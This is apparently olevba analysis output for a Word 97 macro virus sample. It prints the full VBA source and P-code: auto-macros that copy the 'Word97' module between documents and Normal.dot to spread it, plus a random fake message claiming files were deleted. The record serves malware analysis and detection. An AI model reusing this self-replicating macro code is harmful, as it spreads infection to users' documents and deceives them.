olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.GoodLuck-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.GoodLuck-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Word97.bas 
in file: ./Virus.MSWord.GoodLuck-based - OLE stream: 'Macros/VBA/Word97'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExit()
    
    Dim varResponse As Variant
    Dim intRandom As Integer

    Randomize
    intRandom = Int((5 * Rnd) + 1)
    If intRandom = 3 Then
        varResponse = MsgBox("Are you using a registered version of Microsoft Word 97 ?", _
        vbYesNo, "Where do you want to go today ?")
        
        If varResponse = vbYes Then
            MsgBox "Your Word document is corrupted !", vbCritical, "Error !"
        Else
            MsgBox "Thank you fo using Microsoft Word 97, but since you are using an illegal copy of Microsoft product," + Chr(13) + Chr(10) + _
            "your Word documents have been permenant deleted from your hard disk.  - Microsoft Bill Gates", vbExclamation, "Illegal Copy !"
        End If
    End If
    
End Sub

Sub AutoClose()

    On Error Resume Next
    
    Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="Word97", _
        Object:=wdOrganizerObjectProjectItems
    
End Sub

Sub AutoOpen()

    On Error Resume Next
    
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="Word97", _
        Object:=wdOrganizerObjectProjectItems
    
End Sub

Sub AutoNew()

    On Error Resume Next
    
    Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument.FullName, Name:="Word97", _
        Object:=wdOrganizerObjectProjectItems
    
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.GoodLuck-based
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Word97 - 3066 bytes
' Line #0:
' 	FuncDefn (Sub AutoExit())
' Line #1:
' Line #2:
' 	Dim 
' 	VarDefn varResponse (As Variant)
' Line #3:
' 	Dim 
' 	VarDefn intRandom (As Integer)
' Line #4:
' Line #5:
' 	ArgsCall Read 0x0000 
' Line #6:
' 	LitDI2 0x0005 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St intRandom 
' Line #7:
' 	Ld intRandom 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LineCont 0x0004 06 00 08 00
' 	LitStr 0x0039 "Are you using a registered version of Microsoft Word 97 ?"
' 	Ld vbYesNo 
' 	LitStr 0x001F "Where do you want to go today ?"
' 	ArgsLd MsgBox 0x0003 
' 	St varResponse 
' Line #9:
' Line #10:
' 	Ld varResponse 
' 	Ld vbYes 
' 	Eq 
' 	IfBlock 
' Line #11:
' 	LitStr 0x0021 "Your Word document is corrupted !"
' 	Ld vbCritical 
' 	LitStr 0x0007 "Error !"
' 	ArgsCall MsgBox 0x0003 
' Line #12:
' 	ElseBlock 
' Line #13:
' 	LineCont 0x0004 0D 00 0C 00
' 	LitStr 0x0063 "Thank you fo using Microsoft Word 97, but since you are using an illegal copy of Microsoft product,"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitStr 0x005C "your Word documents have been permenant deleted from your hard disk.  - Microsoft Bill Gates"
' 	Add 
' 	Ld vbExclamation 
' 	LitStr 0x000E "Illegal Copy !"
' 	ArgsCall MsgBox 0x0003 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	EndIfBlock 
' Line #16:
' Line #17:
' 	EndSub 
' Line #18:
' Line #19:
' 	FuncDefn (Sub AutoClose())
' Line #20:
' Line #21:
' 	OnError (Resume Next) 
' Line #22:
' Line #23:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Word97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #24:
' Line #25:
' 	EndSub 
' Line #26:
' Line #27:
' 	FuncDefn (Sub AutoOpen())
' Line #28:
' Line #29:
' 	OnError (Resume Next) 
' Line #30:
' Line #31:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Word97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #32:
' Line #33:
' 	EndSub 
' Line #34:
' Line #35:
' 	FuncDefn (Sub AutoNew())
' Line #36:
' Line #37:
' 	OnError (Resume Next) 
' Line #38:
' Line #39:
' 	LineCont 0x0008 09 00 08 00 13 00 08 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0006 "Word97"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #40:
' Line #41:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

